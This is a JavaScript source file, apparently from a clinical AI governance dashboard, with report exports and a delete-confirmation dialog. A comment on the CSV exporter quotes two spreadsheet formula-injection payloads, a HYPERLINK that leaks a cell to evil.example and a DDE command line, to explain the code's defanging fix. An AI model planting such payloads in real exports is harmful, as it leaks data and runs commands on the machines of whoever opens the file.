/* ============================================================
   Exports
   ============================================================ */
const STANDALONE_CSS = () => {
  const css=[...document.styleSheets].flatMap(sh=>{try{return [...sh.cssRules]}catch(e){return []}})
    .filter(r=>r.selectorText && /^(\.label|\.r-|\.overall|\.bars|\.bar|\.rtable|\.tag|\.pchip|\.disclaimer|\.eyebrow|\.gaplist|h1|h2|\.report)/.test(r.selectorText))
    .map(r=>r.cssText).join("\n");
  return `:root{--paper:#fff;--surface:#fff;--sunk:#EEF2F3;--ink:#13233A;--muted:#55667A;--rule:#C9D3D9;--teal:#0E6E66;--amber:#9A5806;--amber-soft:#F7E8CF;--red:#B42318;--red-soft:#F8DCD9;--green:#1F7A3E;--green-soft:#D7EEDD;--sans:"Public Sans","Segoe UI",system-ui,sans-serif;--display:"Archivo","Arial Narrow",Arial,sans-serif}
body{margin:0;background:#fff;color:var(--ink);font:15px/1.55 var(--sans)}main{max-width:900px;margin:0 auto;padding:32px 24px 60px}.r-wrap{overflow-x:auto}
@media print{main{padding:0}h2{break-after:avoid}.label{break-inside:avoid}}
${css}`;
};
function exportHTML(){
  // In the reader's language (R-55, D-60); the JSON and CSV exports stay English.
  const prov = storageNoteShown();
  return `<!DOCTYPE html><html lang="${esc(LOCALE)}" dir="${localeDir(LOCALE)}"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>${esc(S.meta.solution||t("export.untitled"))} – ${esc(t("export.titleSuffix"))}</title>
<!-- No webfont link. The exported report is the artifact that gets emailed
     around a hospital and opened on clinical workstations, and a stylesheet
     link meant every one of those opens contacted a third party, carrying the
     referrer and the viewer's address, from a document containing vendor
     assessments and clinical rationale. STANDALONE_CSS() goes to real trouble
     to inline everything else; this was the one hole left in it. The font
     stacks below end in system-ui. -->
<style>${STANDALONE_CSS()}</style></head><body><main class="report">${reportBody(true)}<p class="disclaimer" data-provenance><strong>${esc(t("export.storedIn",{label:prov.label}))}</strong> ${esc(prov.note)}</p></main></body></html>`;
}
/* PDF, via the browser's own print-to-PDF.

   No PDF library is bundled. Every option (jsPDF, pdfmake, html2pdf) is
   hundreds of kilobytes, and this dashboard has to stay one self-contained
   file small enough to publish as an artifact -- a PDF writer would be larger
   than the entire application. Browsers already render HTML to PDF well, with
   correct fonts, selectable text and working links, which a canvas-based
   library does not give you.

   The report is printed from an offscreen iframe holding exactly the
   standalone HTML export, not from the live page. Printing the page would
   carry the app's own print stylesheet and its DOM state; this way the PDF and
   the HTML download are the same document, and what the user sees in the print
   preview is what the HTML export contains. */
function exportPDF(){
  const frame = document.createElement("iframe");
  frame.setAttribute("aria-hidden", "true");
  frame.setAttribute("title", t("print.frameTitle"));
  frame.style.cssText = "position:fixed;left:-9999px;top:0;width:820px;height:1160px;border:0";  // rtl-ok: off screen either way
  frame.onload = () => {
    const win = frame.contentWindow;
    const go = () => {
      try{ win.focus(); win.print(); }
      catch(e){ toast(t("toast.printFailed")); }
      // Keep the frame alive briefly: some browsers run print() asynchronously
      // and removing it immediately cancels the dialog.
      setTimeout(() => frame.remove(), 60000);
    };
    // Wait for the webfonts, or the first page renders in a fallback face.
    const fonts = win.document.fonts;
    if(fonts && fonts.ready) fonts.ready.then(go).catch(go);
    else setTimeout(go, 400);
  };
  document.body.appendChild(frame);
  // srcdoc keeps it same-origin, so contentWindow.print() is reachable; a blob
  // URL would be a different origin in some browsers and throw.
  frame.srcdoc = exportHTML();
  toast(t("toast.printOpening"));
}

function exportMD(){
  // The Markdown report reads in the reader's language (D-60), like the HTML one.
  const all=allItems(), ov=scoreOf(all), m=S.meta, L=[];
  const st=s=>t(s?STATUS_KEY[s]:"report.unanswered");
  // Backslashes first: escaping only the pipe turned a value's own `\|` into `\\|`,
  // an escaped backslash and a live pipe that ends the cell (#124).
  const line=s=>String(s||"").replace(/\n+/g," ").replace(/\\/g,"\\\\").replace(/\|/g,"\\|");
  const nm=id=>displayName(id);
  const fieldLine=(labelKey,value)=>t("md.fieldLine",{label:t(labelKey),value});
  const shown=(map,v)=>v?(map[v]?t(map[v]):v):"–";
  const prov=storageNoteShown();
  L.push(`# ${m.solution||t("project.untitled")}: ${t("export.titleSuffix")}`,"");
  L.push(fieldLine("report.status",statusLabel(statusOf(S))),fieldLine("report.phase",phaseLabel(phase(S))),fieldLine("report.org",m.org||"–"),fieldLine("report.developer",m.developer||"–"),fieldLine("report.sourcing",shown(SOURCING_KEY,m.sourcing)),fieldLine("report.riskTier",shown(RISK_KEY,m.riskTier)),fieldLine("report.sponsor",m.sponsor||"–"),fieldLine("report.nextReview",nextReview(S)||"–"),fieldLine("md.team",line(m.reviewers)||"–"),fieldLine("md.scope",line(m.scope)||"–"),fieldLine("md.generated",TODAY()),fieldLine("md.language",LOCALE),fieldLine("md.storedIn",`${prov.label}. ${prov.note}`),"");
  const F=flags(S); L.push(`## ${t("report.flags")}`,""); if(F.length) F.forEach(f=>L.push(`- **${t(f.sev==="red"?"status.red":"status.amber")}:** ${flagText(f)}`)); else L.push(t("md.none")); L.push("");
  L.push(`## ${t("report.readiness")}`,"",t("md.overall",{pct:ov.pct,answered:ov.answered,total:ov.total}),"",`| ${t("report.col.principle")} | ${t("report.col.score")} |`,"|---|---|");
  Object.keys(PRINCIPLES).forEach(k=>L.push(`| ${principleName(k)} | ${scoreOf(all.filter(it=>it.p===k)).pct}% |`));
  L.push("",`## ${t("report.checkpoints")}`,"",`| ${t("report.col.checkpoint")} | ${t("gate.decision")} | ${t("gate.by")} | ${t("report.col.date")} | ${t("md.rationale")} |`,"|---|---|---|---|---|");
  Object.keys(GATES).forEach(k=>{const g=S.gates[k]||{}; L.push(`| ${gateTitle(k)}: ${gateQuestion(k)} | ${g.decision?optionText(g.decision):t("md.notDecided")} | ${line(g.by)}${g.signedBy?` (${t("report.recordedBy",{who:line(nm(g.signedBy))})})`:""} | ${line(g.date)} | ${line(g.rationale)} |`);});
  L.push("",`## ${t("md.openGaps")}`,"");
  const gaps=all.filter(it=>{const s=(S.items[it.id]||{}).status; return !s||s==="notmet"||s==="partial";});
  if(gaps.length){ L.push(`| ${t("report.col.stage")} | ${t("report.col.criterion")} | ${t("report.status")} | ${t("ci.owner")} | ${t("ci.due")} |`,"|---|---|---|---|---|"); gaps.forEach(it=>{const d=S.items[it.id]||{}; L.push(`| ${it.stage.n} | ${line(itemText(it))} | ${st(d.status)} | ${line(d.owner)} | ${line(d.due)} |`);}); }
  else L.push(t("md.none"));
  L.push("",`## ${t("card.title")}`,"");
  if(frameworkTranslated()) L.push(`_${t("fw.note")}_`,"");
  CARD.forEach(sec=>{L.push(`### ${cardSecName(sec)}`,""); sec.fields.forEach(f=>L.push(`- **${cardLabel(f[0])}:** ${line(cardValOf(S,f[0]))||`_${t("label.notProvided")}_`}`)); L.push("");
    if(sec.sec==="Trust ingredients"){ L.push(`### ${t("metrics.title")}`,""); if(S.metrics.length){L.push(`| ${t("metrics.col.category")} | ${t("metrics.col.metric")} | ${t("metrics.col.value")} | ${t("metrics.col.ci")} | ${t("md.population")} |`,"|---|---|---|---|---|"); S.metrics.forEach(x=>L.push(`| ${line(metricCatName(x.cat))} | ${line(x.name)} | ${line(x.value)} | ${line(x.ci)} | ${line(x.pop)} |`));} else L.push(`_${t("md.noneEntered")}_`); L.push("");}});
  L.push(`## ${t("report.history")}`,""); if(logWindowNote()) L.push(`_${logWindowNote()}_`,""); if(LOG.length) LOG.forEach(e=>L.push(`- ${(e.at||"").slice(0,10)}: ${line(e.text)} (${line(nm(e.by))})`)); else L.push(t("md.none")); L.push("");
  L.push(`## ${t("report.appendix")}`,"");
  STAGES.forEach(s=>{L.push(`### ${s.n}. ${stageTitle(s)}`,""); s.items.forEach(it=>{const d=S.items[it.id]||{}; L.push(`- [${it.p}] ${itemText(it)}: **${st(d.status)}**${d.evidence?` (${line(d.evidence)})`:""}`);}); L.push("");});
  L.push("---",`_${t("md.footer")}_`);
  return L.join("\n");
}
function projectJSON(p){
  const all=allItems();
  const state=clone(p); delete state.id;
  return {
    schema:"chai-review/2", generated:new Date().toISOString(), storage:storageNote(),
    status:statusOf(p).label, phase:phase(p).label, next_review:nextReview(p), flags:flags(p),
    meta:p.meta, gates:p.gates, metrics:p.metrics,
    model_card:Object.fromEntries(CARD_FIELDS.map(k=>[k,cardValOf(p,k)])),
    checklist:all.map(it=>({id:it.id,stage:it.stage.n,principle:it.p,criterion:it.text,...(({status,evidence,owner,due})=>({status:status||null,evidence:evidence||"",owner:owner||"",due:due||""}))(p.items[it.id]||{})})),
    scores:{overall:scoreOf(all,p.items).pct,...Object.fromEntries(Object.keys(PRINCIPLES).map(k=>[k,scoreOf(all.filter(it=>it.p===k),p.items).pct]))},
    _state:state
  };
}
/* One CSV field, quoted and defanged.

   RFC 4180 quoting is not enough here. Excel, LibreOffice and Google Sheets
   all treat a cell beginning with =, +, - or @ as a FORMULA, inside quotes or
   not, so a project named

     =HYPERLINK("https://evil.example/?x="&A1,"Review status")

   becomes a live link in every committee member's copy of the portfolio
   export. =cmd|'/c calc'!A0 is the DDE variant. The portfolio CSV exists
   specifically to be opened in a spreadsheet, and any writer on any single
   project controls one of its cells.

   A leading apostrophe makes the spreadsheet treat the rest as literal text.
   It is visible in the formula bar and not in the cell, which is the least
   intrusive fix that actually works. Leading tab and carriage return are
   included because they slip past a naive check on the first character and
   still leave a formula behind. */
const CSV_FORMULA = /^[=+\-@\t\r]/;
function csvField(value){
  let text = String(value ?? "");
  if(CSV_FORMULA.test(text)) text = "'" + text;
  return `"${text.replace(/"/g,'""')}"`;
}

function exportCSV(){
  const q=csvField;
  const head=["Project","Developer","Clinical sponsor","Risk tier","Lifecycle phase","Status","Readiness %","Next review","Flags","Archived","Last updated","Stored in"];
  const rows=dashData().map(r=>[r.p.meta.solution,r.p.meta.developer,r.p.meta.sponsor,r.p.meta.riskTier,phase(r.p).label,r.st.label,r.score,r.nr||"",r.f.map(f=>f.text).join("; "),r.p.archived?"yes":"",(r.p.updatedAt||"").slice(0,10),storageNote().label]);
  return [head,...rows].map(r=>r.map(q).join(",")).join("\r\n");
}
const slug = s=> (s||"ai-solution").toLowerCase().replace(/[^a-z0-9]+/g,"-").replace(/^-|-$/g,"").slice(0,60) || "ai-solution";

let DL=null, dlChecked=false;
const STANDALONE = !(window.claude && typeof window.claude.use==="function");
function updateDlUI(){
  const fb=document.getElementById("dlFallback"); if(!fb) return;
  // dl-pdf is deliberately excluded: it goes through the browser's print
  // dialog, not the downloads API, so it keeps working in a view where saving
  // a file does not. Hiding it with the rest would remove the one export still
  // available exactly when the others are gone.
  const btns=[...document.querySelectorAll('#ractions [data-act^="dl-"]')]
    .filter(b=>b.dataset.act!=="dl-pdf");
  if(DL||STANDALONE){ btns.forEach(b=>b.hidden=false); fb.innerHTML=""; return; }
  if(!dlChecked) return;
  btns.forEach(b=>b.hidden=true);
  fb.innerHTML=`<details class="fallback"><summary style="cursor:pointer;font-size:14px;font-weight:600">${esc(t("dl.unavailable"))}</summary>
    <p style="font-size:13px;color:var(--muted)">${esc(t("dl.howTo"))}</p>
    <label class="vh" for="fbmd">Markdown</label><textarea id="fbmd" readonly>${esc(exportMD())}</textarea>
    <label class="vh" for="fbjs">JSON</label><textarea id="fbjs" readonly style="margin-top:8px">${esc(JSON.stringify(projectJSON(S),null,2))}</textarea></details>`;
}
/* Report an export to the server, where there is one. A failure is said out loud: the
   file was produced either way, but the user should not believe it was recorded when
   it was not (the same reasoning as the audit queue, #45). */
async function noteExport(format){
  if(!STORE || typeof STORE.recordExport!=="function") return;
  try{ await STORE.recordExport(format===ExportFormat.CSV ? null : CUR, format); }
  catch(e){ toast(t("toast.exportNotRecorded")); }
}

async function download(filename,data){
  if(STANDALONE){
    const types={html:"text/html",md:"text/markdown",json:"application/json",csv:"text/csv"};
    const ext=filename.split(".").pop();
    const url=URL.createObjectURL(new Blob([data],{type:(types[ext]||"text/plain")+";charset=utf-8"}));
    const a=document.createElement("a"); a.href=url; a.download=filename; document.body.appendChild(a); a.click(); a.remove();
    setTimeout(()=>URL.revokeObjectURL(url),1000); toast(t("toast.savedFile",{name:filename})); return;
  }
  if(!DL){ toast(t("toast.noDownloads")); return; }
  try{ const r=await DL.save({filename,data}); if(r&&r.status==="saved") toast(t("toast.savedFile",{name:filename})); }
  catch(e){
    const c=e&&e.code;
    if(c==="declined") return;
    if(c==="rate_limited") toast(t("toast.savePromptOpen"));
    else if(c==="extension_not_enabled") toast(t("toast.fileTypeUnavailable"));
    else { DL=null; updateDlUI(); toast(t("toast.noDownloads")); }
  }
}

/* Deleting a project destroys a governance record for everyone, and
   cannot be undone. A browser confirm() is one reflexive click away
   from that, and the click that does it looks exactly like every
   other confirm the user dismisses all day.

   So the name has to be typed. Not as friction for its own sake: it
   forces the user to read WHICH project they are about to destroy,
   which is the mistake that actually happens -- deleting the right
   kind of thing from the wrong row. */
function openDeleteDialog(){
  const name = S.meta.solution || t("project.untitled");
  /* Only the server keeps a version history, so only it can offer to destroy one.
     In the other modes deleting really does remove everything, and the plain
     wording is accurate; offering a choice with nothing behind it would not be. */
  const canPurge = typeof STORE.purgeVersions === "function";
  const heading = canPurge ? t("del.title") : t("del.titleForever");
  const consequence = canPurge
    ? `<p>${esc(t("del.removes"))}</p>
      <p><b>${esc(t("del.historyKeptTitle"))}</b> ${esc(t("del.historyKeptDetail"))}</p>`
    : `<p>${esc(t("del.destroys"))}</p>`;
  const purgeChoice = canPurge ? `
      <label style="display:flex;gap:8px;align-items:flex-start;margin:12px 0 2px">
        <input type="checkbox" id="delPurge" aria-describedby="delPurgeHint"
               style="margin-top:4px">
        <span><b>${esc(t("del.purgeChoice"))}</b></span>
      </label>
      <p id="delPurgeHint" class="small" style="color:var(--muted);margin-top:0">${esc(t("del.purgeHint"))}</p>` : "";
  const host = document.createElement("div");
  host.className = "modal-backdrop";
  host.innerHTML = `
    <div class="modal" role="dialog" aria-modal="true" aria-labelledby="delTitle">
      <h2 id="delTitle" style="margin-top:0">${esc(heading)}</h2>
      ${consequence}
      <p>${esc(t("del.archiveInstead"))}</p>${purgeChoice}
      <label for="delName">${tHtml("del.typeName",{},{name:`<b>${esc(name)}</b>`})}</label>
      <input type="text" id="delName" autocomplete="off" spellcheck="false"
             aria-describedby="delHint">
      <p id="delHint" class="small" style="color:var(--muted)">${esc(t("del.mustMatch"))}</p>
      <div style="display:flex;gap:8px;justify-content:flex-end;margin-top:14px">
        <button class="btn" data-del-cancel>${esc(t("dash.cancel"))}</button>
        <button class="btn" data-del-archive>${esc(t("del.archiveButton"))}</button>
        <button class="btn danger" data-del-go disabled>${esc(canPurge ? t("setup.delete") : t("del.forever"))}</button>
      </div>
    </div>`;
  document.body.appendChild(host);

  const field = host.querySelector("#delName");
  const go = host.querySelector("[data-del-go]");
  const purgeBox = host.querySelector("#delPurge");
  if(purgeBox) purgeBox.addEventListener("change", () => {
    go.textContent = purgeBox.checked ? t("del.goPurge") : t("setup.delete");
  });
  const close = () => { host.remove(); document.removeEventListener("keydown", onKey); };
  const onKey = e => { if(e.key === "Escape") close(); };

  field.addEventListener("input", () => { go.disabled = field.value.trim() !== name; });
  field.addEventListener("keydown", e => { if(e.key === "Enter" && !go.disabled) go.click(); });
  host.querySelector("[data-del-cancel]").onclick = close;
  host.addEventListener("click", e => { if(e.target === host) close(); });
  document.addEventListener("keydown", onKey);

  host.querySelector("[data-del-archive]").onclick = () => {
    close();
    const v = !S.archived;
    S.archived = v;
    queuePatch(CUR, Object.assign({archived:v}, stamp()));
    writeLog(CUR, "Archived");
    renderMain(false);
    toast(t("toast.archived"));
  };

  go.onclick = async () => {
    if(field.value.trim() !== name) return;   // belt and braces
    const id = CUR;
    const destroy = !!(purgeBox && purgeBox.checked);
    go.disabled = true; go.textContent = t("del.deleting");
    close();
    delete pending[id]; clearTimeout(timers[id]);
    /* History first, then the project. If destroying the history fails, the project
       is NOT deleted, so nobody is left believing the data went when it did not.
       The other order would delete the record and then leave its history behind. */
    if(destroy){
      try{ await STORE.purgeVersions(id); }
      catch(err){ toast(t("toast.purgeFailed")); return; }
    }
    try{
      await STORE.remove(id); goHome();
      toast(destroy ? t("toast.deletedPurged") : t("toast.deleted"));
    }
    catch(err){
      toast(destroy ? t("toast.purgedNotDeleted")
                    : t("toast.deleteFailed"));
    }
  };

  setTimeout(() => field.focus(), 0);
}
